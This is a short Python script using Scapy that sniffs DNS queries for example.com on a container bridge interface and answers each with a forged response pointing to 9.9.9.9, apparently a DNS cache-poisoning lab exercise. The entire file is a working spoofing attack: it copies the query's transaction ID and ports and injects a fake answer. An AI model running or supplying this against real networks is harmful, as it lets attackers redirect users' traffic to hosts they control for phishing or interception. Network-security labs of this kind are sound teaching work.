from scapy.all import *

NS_NAME = "example.com"
def spoof_cache(pkt):
    if(DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print("=== Packet info ===")
        print(f"IP Source: {pkt[IP].src}")
        print(f"IP Destination: {pkt[IP].dst}")
        print(f"Source port: {pkt[UDP].sport}")
        print(f"Destination port: {pkt[UDP].dport}")
        print("\n\n")
        
        # Construct IP and UDP header
        ip = IP(src = pkt[IP].dst, dst = pkt[IP].src)
        udp = UDP(sport = 53, dport = pkt[UDP].sport)

        # Construct the Answer section
        AnsRR = DNSRR(rrname = pkt[DNS].qd.qname, ttl = 100, rdata = '9.9.9.9')   # Default type is 'A' and rclass is 'IN'

        # Construct DNS header
        dns = DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, qr = 1, rd = pkt[DNS].rd, ra = 1, ancount = 1,
                    an = AnsRR)         # Default qdcount is '1'
        
        # Create a spoofed packet
        spoofed_pkt = ip/udp/dns
        send(spoofed_pkt)

# Should be the interface that sends packets out the Internet.
f = "udp and dst port 53"
pkt = sniff(iface="br-707b51758c93", filter = f, prn=spoof_cache)